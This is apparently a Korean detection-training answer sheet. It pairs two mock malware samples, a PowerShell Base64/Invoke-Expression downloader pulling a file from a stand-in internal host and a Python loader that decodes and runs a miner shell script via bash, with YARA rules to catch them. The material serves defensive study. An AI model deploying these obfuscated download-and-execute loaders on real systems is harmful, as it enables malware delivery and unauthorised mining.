# 📌 실습 파일(답안 예시)

### **1) ps_downloader_obf1.ps1 — 내부망을 대상으로 한 PowerShell 다운로더**

### **2) miner_loader_obf3.py — 내부 C2에서 받은 Base64 payload로 채굴 로더 실행**

------

## 1️⃣ **ps_downloader.ps1 (다운로더 + 내부망 통신 + Base64 명령 실행)**

```
$u="http://files-gw01.intra-sec.local/prod/update.bin";
$p="C:\Users\svc_ops\AppData\Local\Temp\update_svc.bin";

# 내부 운영팀 계정 위장
$account="svc_ops_prod";

# 내부 유지보수서버 인증 체크를 위장
$ping="http://auth-check.intra-sec.local/api/ping?user=$account";

$e="SQBkAHcAIAAkAHA...==";   # 실제 Base64 payload (축약)
$bytes=[System.Convert]::FromBase64String($e);

# Base64 디코딩 후 내부 점검 스크립트인 것처럼 위장
Invoke-Expression([System.Text.Encoding]::Unicode.GetString($bytes));

Invoke-WebRequest -Uri $u -OutFile $p
Write-Output "[INTERNAL] $account downloaded $u to $p"
```

✔ 내부정보

- `files-gw01.intra-sec.local` → 내부 파일 게이트웨이
- `auth-check.intra-sec.local` → 내부 인증 서비스
- `svc_ops_prod` → 실제 운영계 서비스 계정 느낌
- 내부망에서 많이 쓰는 `/api/ping?user=` 구조

✔ 공격 흐름

1. Base64로 난독화된 PowerShell 명령 실행
2. 내부 파일 게이트웨이에서 악성 파일 다운로드
3. 내부 계정으로 위장된 로그 출력

------

## 🎯 **YARA 룰 (우회에도 강하고 실제 악성행위 기반)**

```yara
rule ps_internal_b64_downloader
{
    meta:
        description = "Base64-decoded PowerShell + internal gateway download"
        author = "training"

    strings:
        // 행위 기반 식별
        $b64  = "[System.Convert]::FromBase64String" nocase
        $iex  = "Invoke-Expression" nocase
        $wget = "Invoke-WebRequest" nocase

        // 내부망 지능형 패턴
        $intra1 = ".intra-sec.local" nocase
        $intra2 = "files-gw01.intra-sec.local" nocase
        $intra3 = "/api/ping?user=" nocase

    condition:
        // 행위 기반: Base64 + 실행 + 다운로드
        ( $b64 and $iex and $wget )
        // 내부망 흔적 최소 하나 포함 → 고정 도메인 우회도 잡음
        and (1 of ($intra*))
}
```

### 🔥 설명

- **Base64 → IEX → Invoke-WebRequest**
   → PowerShell 기반 다운로더의 핵심 TTP
- 내부 도메인 중 어느 하나라도 포함되면 탐지
   → 도메인만 살짝 바꿔도 `.intra-sec.local` 은 남아 있을 확률 높음

### 🎯 우회 난이도

- Base64 사용을 PowerShell에서 포기해야 하고
- 내부망 통신 흔적도 지워야 하는 수준 → **현실 공격에서도 어렵다**



------

## 2️⃣ **miner_loader.py (Base64 payload → 내부 C2 → 셸 실행)**

```
# 내부 채굴 통계 서버
C2 = "ai-mining-gw01.intra-sec.local"

import base64, subprocess, os

# 내부 작업 스케줄러에서 내려오는 것처럼 위장된 payload
payload = "IyEvYmluL3NoCmMgL3Zhci9sb2cvYWkvc3ZjX21pbmVyLnNo"

# Base64 디코딩된 파일은 다음 경로에 저장됨
out_path = "/home/prod/svc/ai_worker/m_loader.sh"

dec = base64.b64decode(payload).decode()

with open(out_path,"w") as f:
    f.write(dec)

# 내부권한으로 자동 실행되는 것처럼 위장
subprocess.call(["/bin/bash", out_path])
```

✔ 내부정보

- `/home/prod/svc/ai_worker/` → 내부 프로덕션 계정
- `ai-mining-gw01.intra-sec.local` → “AI” 사업군 위한 내부 게이트웨이
- Base64 payload 실행 흐름이 공격적이면서 실전적

------

## 🎯 **YARA 룰 (우회 방지 + 행위 중심)**

```yara
rule py_internal_b64_miner_loader
{
    meta:
        description = "Python miner loader using Base64 + bash execution"
        author = "training"

    strings:
        // 핵심 악성행위
        $b64decode = "base64.b64decode" nocase
        $bash      = "/bin/bash" nocase
        $call      = "subprocess.call" nocase
        $sh_ext    = ".sh" nocase

        // 내부망 패턴
        $c2_1 = "ai-mining-gw01.intra-sec.local" nocase
        $path = "/home/prod/svc/ai_worker/" nocase

    condition:
        // 로더 핵심 구조: B64 → bash → subprocess
        ( $b64decode and $call and $bash )
        and $sh_ext
        // 내부정보 기반 패턴 중 하나라도 포함
        and ( $c2_1 or $path )
}
```

### 🔥 설명

- Base64 디코딩 + bash 실행은 리눅스 채굴 로더의 교과서 TTP
- 파일명(`m_loader.sh`)을 정적으로 요구하지 않아 우회에도 강함
- 내부 C2 또는 내부 filepath 중 하나만 남아 있으면 탐지 유지

### 🎯 우회 난이도

- Base64 방식 포기하거나
- bash 실행 방식 자체를 바꾸지 않는 이상 우회 어려움